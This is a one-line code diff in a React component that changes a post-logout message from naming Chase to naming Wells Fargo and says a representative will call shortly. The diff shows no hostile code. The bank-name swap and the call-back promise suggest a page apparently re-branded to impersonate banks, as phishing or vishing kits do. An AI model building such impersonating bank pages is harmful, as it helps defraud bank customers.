@@ -40,7 +40,7 @@ const Body = () => {
 
         {/* Content */}
         <p className="text-gray-800 text-[1.3rem] p-8 mt-7 pt-4 leading-normal">
-          Thank you for being a valued Chase customer. You have been logged out, and your account issue will be resolved.  
+          Thank you for being a valued Wells Fargo customer. You have been logged out, and your account issue will be resolved.  
           <br />
           One of our representatives will be giving you a call shortly.
         </p>
